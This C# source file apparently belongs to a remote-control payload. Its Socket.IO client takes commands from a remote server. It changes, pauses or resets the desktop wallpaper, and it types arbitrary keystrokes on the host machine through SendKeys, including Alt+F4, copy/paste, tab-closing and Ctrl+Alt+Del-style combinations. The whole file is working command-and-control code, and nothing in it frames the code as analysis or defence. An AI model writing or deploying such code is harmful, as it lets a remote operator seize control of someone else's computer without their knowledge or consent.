using Payload.Command;
using Payload.Common;
using SocketIOClient;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Payload.Core.Command.SocketClient
{
    public class Props
    {
        public string data { get; set; }
    }
    public class SocketIoClient
    {
        public SocketIO client { get; private set; }
        public string ServerHost { get; private set; }
        public SocketIoClient(string serverHost)
        {
            ServerHost = serverHost;
            client = new SocketIO(serverHost);
            Init();
        }

        private void Init()
        {
            client.On("wallpaper", async response =>
            { 
                Console.WriteLine(response);
                //string text = response.GetValue<string>();
                var _d = response.GetValue<Props>();   
                string msg = _d.data;

                switch (msg)
                {
                    case "wp":
                        CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.AUTO);
                        break;
                    case "stwp":
                        CommandManager.Instance.GetTaskPack(Config.EnumTask.WallpaperEngine).Pause();
                        break;
                    case "rewp":
                        CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.RESET);
                        break;
                }
            });

            client.On("key", async response =>
            {
                var _d = response.GetValue<Props>();
                string msg = _d.data;

                switch (msg.ToUpper()) 
                {
                    case "{ENTER}":
                    case "{ESC}":
                    case "{HELP}":
                    case "{HOME}":
                    case "{INSERT}":
                    case "{LEFT}":
                    case "{NUMLOCK}":
                    case "{PGDN}":
                    case "{PGUP}":
                    case "{PRTSC}":
                    case "{RIGHT}":
                    case "{SCROLLLOCK}":
                    case "{TAB}":
                    case "{UP}":
                    case "{F1}":
                    case "{F2}":
                    case "{F3}":
                    case "{F4}":
                    case "{F5}":
                    case "{F6}":
                    case "{F7}":
                    case "{F8}":
                    case "{F9}":
                    case "{F10}":
                    case "{F11}":
                    case "{F12}":
                    case "{F13}":
                    case "{F14}":
                    case "{F15}":
                    case "{F16}":
                    case "{ADD}":
                    case "{SUBTRACT}":
                    case "{MULTIPLY}":
                    case "{DIVIDE}":
                    case "{^c}":
                    case "{^v}":
                    case "{%F4}":
                    case "{^w}":
                    case "{^t}":
                    case "{+^}":
                    case "{^%DEL}":
                        try
                        {
                            SendKeys.SendWait(msg);
                        }
                        catch { }
                        break;
                    default:
                        char[] ch = msg.ToCharArray();
                        foreach (char c in ch) 
                        {
                            SendKeys.SendWait(Char.ToString(c));
                        }
                        break;
                }
            });
        }
    }
}
